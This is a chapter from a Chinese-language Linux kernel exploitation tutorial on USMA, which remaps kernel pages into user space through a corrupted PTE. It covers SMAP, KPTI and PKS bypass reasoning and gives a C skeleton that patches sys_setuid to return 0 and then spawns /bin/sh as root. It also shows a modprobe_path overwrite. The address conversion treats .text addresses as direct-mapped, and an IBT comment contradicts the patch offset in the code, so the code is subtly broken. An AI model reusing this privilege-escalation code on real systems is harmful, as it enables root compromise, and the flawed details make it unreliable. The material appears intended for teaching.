# Ch 15 — USMA：把 kernel page 映射進 userspace

> 目標：USMA（User-Space Mapping Attack）透過控制 PTE，把 kernel `.text` 或 `.data` 的 page 映射進 user-space VA。之後直接讀寫那個 VA 就是讀寫 kernel 記憶體，繞過 SMAP，不需要 kernel gadget。

## USMA 和 Dirty Pagetable 的差異

Ch 14 的 Dirty Pagetable 是「把 user VA 的物理映射改成 target physical page」，用途是拿任意實體 R/W。

USMA 的目標更直接：

```
Dirty Pagetable：user VA → 改指向 target physical page → 任意 phys R/W
USMA：         user VA → 改指向 kernel .text / .data 的 physical page → 直接讀寫 kernel 虛擬記憶體
```

效果：**你在 user space 就能 patch kernel code、或讀寫任意 kernel 全域變數**，不需要任何 ROP、不需要 kernel 執行你的 gadget。

### SMAP 為什麼不擋 USMA

SMAP 擋的是「kernel 在 CPL=0 時存取 user-space 的 VA」（CR4.SMAP bit）。

USMA 不涉及這個場景 — 你是 **user-space 在讀寫「映射到 kernel 物理 page 的 user VA」**，這是 CPL=3 的普通 memory access，SMAP 完全不管。

---

## 技術細節

### Step 1：找到 kernel .text 的物理地址

kernel .text 的 virtual address 可以從 `kernel_base`（KASLR leak）推算：

```
kernel virt addr = kernel_base + symbol_offset
```

然後要把 VA 轉成 PA（物理地址）。方法：

**方法 A：direct-mapping 關係**

x86-64 kernel 把所有物理記憶體直接映射到 `PAGE_OFFSET + 物理地址`（`PAGE_OFFSET` 通常是 `0xffff888000000000`）。這個 direct mapping 的 VA = `PAGE_OFFSET + physical_addr`。

所以如果你知道 kernel VA，就能算物理地址：

```c
uint64_t text_phys = kernel_virt - PAGE_OFFSET;
/* PAGE_OFFSET = 0xffff888000000000（可能根據 config 不同） */
```

**方法 B：先用 Dirty Pagetable 拿到任意 phys R/W，再掃物理記憶體**

掃物理記憶體找 kernel ELF magic（`\x7fELF`）→ 找到 kernel image → 算 symbol offset。

### Step 2：改 PTE 讓 user VA 指向 kernel 物理 page

和 Dirty Pagetable 完全一樣的手法，差別在 target physical page：

```c
/* target_phys = kernel .text 某個 page 的物理地址 */
uint64_t evil_pte = target_phys
                  | PTE_PRESENT
                  | PTE_WRITABLE   /* R/W — 讓你能 patch code */
                  | PTE_USER;      /* U bit — user-space 可讀 */
/* 不加 PTE_NX，讓 page 保持可執行 */
```

**WP bit**（CR0.Write Protect）：kernel 開 WP 時，ring 0 不能寫 read-only page。但你走 user-space 改 PTE 的方式不受 WP 影響 — WP 只影響 ring 0 的 write，你是 ring 3。

### Step 3：讀寫 mapped VA

```c
/* map_va 是你 mmap 的 VA range 的某頁 */
/* 已透過 Dirty Pagetable 把 PTE 改成指向 kernel .text page */

volatile uint8_t *ktext = (volatile uint8_t *)map_va;

/* 讀 kernel code */
printf("kernel bytes: %02x %02x %02x\n", ktext[0], ktext[1], ktext[2]);

/* patch kernel code（直接寫） */
ktext[0] = 0x90;  /* nop */

/* 改 modprobe_path（如果你映射到 .data） */
char *mpath = (char *)ktext + modprobe_path_page_off;
strcpy(mpath, "/tmp/x");
```

---

## USMA 的威力：不需要 ROP 的 kernel patch

傳統 exploit 要寫 kernel code 必須：
1. leak kernel base
2. 找 gadget
3. 組 ROP chain
4. 控 RIP 執行 ROP

USMA 之後：
1. leak kernel base（算 symbol 物理地址）
2. PTE 改掉，mapped VA 指向 target kernel page
3. 直接寫那個 VA → kernel memory 改了

**實際案例**：把 `setuid()` 的函式 prologue 改成 `xor eax, eax; ret`（return 0 = success），然後任何 process 呼叫 `setuid(0)` 都成功，不需要任何 ROP gadget。

---

## 複合用法：USMA + Dirty Pagetable pipeline

```
UAF
 └─→ cross-cache → PTE page（Dirty Pagetable）
      └─→ 任意 phys R/W
           ├─→ 掃物理記憶體找 kernel image phys base
           ├─→ 改 modprobe_path（data only）
           └─→ USMA：映射 kernel .text → patch setuid / commit_creds
```

Dirty Pagetable 解決「任意 phys R/W」，USMA 在其基礎上做「kernel code patch」。

---

## 限制與 mitigation 對抗

### PKS（Protection Keys for Supervisor）
kernelCTF 的 Mitigation 賽道啟用 PKS，對 page table pages 加 supervisor protection key。即使你改了 PTE，kernel 在 supervisor mode 存取時仍受 PKRS 限制。**但你是 user-space 讀寫，不受 PKRS 影響** — PKS 只保護 supervisor 存取，不管 user 存取已映射的 page。

### SLAB_VIRTUAL
讓 slab page 不走 buddy，cross-cache 失效，就拿不到 PTE page。USMA 依賴 Dirty Pagetable 的前置步驟，所以 SLAB_VIRTUAL 擋住了整條鏈。

### KPTI + CR3 切換
KPTI 讓 user-space 的 page table 裡只有很少的 kernel mapping。USMA 繞過 KPTI 的方式：**你不是靠 user page table 裡「已有的 kernel 映射」來讀 — 你是靠 Dirty Pagetable 直接在 user page table 裡加一條 PTE，指向 kernel 物理 page**。KPTI 的 isolation 是 kernel 側的事，你改 user page table 不受它限制。

---

## Exploit 骨架（USMA → patch setuid）

```c
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

/* 假設已透過 Ch 6 的 leak 拿到 kernel_base 和 page_offset */
extern uint64_t kernel_base;   /* _text 的 VA */
extern uint64_t page_offset;   /* 通常 0xffff888000000000 */

/* 把 kernel VA 轉成物理地址 */
static uint64_t kva_to_phys(uint64_t kva) {
    return kva - page_offset;
}

#define PTE_P  (1ULL<<0)
#define PTE_RW (1ULL<<1)
#define PTE_US (1ULL<<2)

extern void write_dangling_pte(uint64_t pte_val);  /* Ch 14 實作的函式 */
extern volatile uint8_t *user_va_mapped;           /* Ch 14 mmap 的 VA */

int main(void)
{
    /* 1. 找 sys_setuid 的物理 page */
    uint64_t setuid_va   = kernel_base + SETUID_OFFSET;  /* 從 kallsyms 算 */
    uint64_t setuid_phys = kva_to_phys(setuid_va);
    uint64_t setuid_page = setuid_phys & ~0xFFFULL;
    uint64_t setuid_off  = setuid_phys & 0xFFF;

    /* 2. 用 Dirty Pagetable 把某個 user VA 的 PTE 改成指向 setuid page */
    uint64_t evil_pte = setuid_page | PTE_P | PTE_RW | PTE_US;
    write_dangling_pte(evil_pte);

    /* 3. user_va_mapped 現在直接讀寫 sys_setuid 所在的物理 page */
    volatile uint8_t *mapped = user_va_mapped + setuid_off;

    /* 4. patch sys_setuid prologue → xor eax, eax (31 c0) ; ret (c3) */
    /* 開 IBT 的 kernel 函式開頭是 endbr64 (f3 0f 1e fa，4 bytes)，從 +4 patch */
    mapped[0] = 0x31; mapped[1] = 0xc0; mapped[2] = 0xc3;

    /* 5. 現在 setuid(0) 直接 return 0，不驗權限 */
    if (setuid(0) != 0) { puts("patch failed"); return 1; }
    printf("[+] uid = %d\n", getuid());
    execl("/bin/sh", "sh", NULL);
    return 0;
}
```

## 動手練習

1. **讀 PTE 定義**：`arch/x86/include/asm/pgtable_types.h`，找 `_PAGE_PRESENT`、`_PAGE_RW`、`_PAGE_USER`、`_PAGE_NX` 的 bit 定義，確認與 exploit 骨架一致。
2. **QEMU 驗 mapping**：exploit 改完 PTE 後，用 `hmp info tlb` 確認 user VA 確實指向 kernel 物理 page。
3. **測量 KPTI 不擋 USMA**：在 QEMU 開 `kpti=1` 的情況下跑 exploit，確認 user-space 讀 mapped page 不 crash。
4. **patch `commit_creds`**：改 patch 目標，把 `commit_creds` 前 3 bytes 改成 `xor eax, eax; ret`，觀察每次 fork 後子 process 的 cred 狀態。
5. **從物理掃描找 kernel base**：先用 Dirty Pagetable 拿到任意 phys R/W，掃 0x1000000 附近物理地址找 `\x7fELF`，定位 kernel image，算出 `setuid_offset`。

## 自我檢核

- [ ] 能解釋 USMA 和 Dirty Pagetable 目標的差異（code patch vs phys R/W）
- [ ] 知道 SMAP 為什麼不擋 USMA（ring 3 access）
- [ ] 能從 kernel VA 算出物理地址（`kva - PAGE_OFFSET`）
- [ ] 知道 CR0.WP 和 user-space write 之間的關係（WP 只擋 ring 0）
- [ ] 知道 KPTI 為什麼不擋 USMA（user pagetable 自己改 PTE）
- [ ] 能說出 SLAB_VIRTUAL 在哪個步驟讓 USMA 失效（前置 cross-cache 失效）

---

Ch 13-15 構成了現代 kernel exploit 的核心武器庫。下一章轉守方：2023 年後的 kernel 在防什麼、每層 mitigation 的原理、你前面學的哪些招被打死了。

→ [Ch 16 — 2023+ kernel 在 defend 什麼](./16-modern-mitigations.md)
